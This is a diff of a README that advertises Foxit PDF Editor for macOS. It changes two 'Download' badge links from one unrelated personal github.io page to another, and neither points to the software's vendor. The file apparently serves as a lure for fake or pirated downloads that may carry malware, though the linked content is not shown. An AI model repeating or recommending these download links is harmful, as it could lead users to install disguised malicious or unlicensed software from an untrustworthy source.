@@ -3,7 +3,7 @@
 Foxit PDF Editor is a versatile PDF solution designed for macOS users to create, edit, and manage PDF documents efficiently. It offers professional-grade features suitable for business and personal use, all within a native Mac environment.
 
 ## ✅ Download Foxit PDF Editor for macOS  
-[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](https://shuziktobehuman.github.io/huja/Foxit)
+[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](https://mitrobandus.github.io/.github/Foxit)
 
 ---
 
@@ -58,7 +58,7 @@ Foxit PDF Editor provides a comprehensive set of tools for editing, annotating, 
 
 ---
 
-[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](https://shuziktobehuman.github.io/huja/Foxit)
+[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](https://mitrobandus.github.io/.github/Foxit)
 
 ---
 
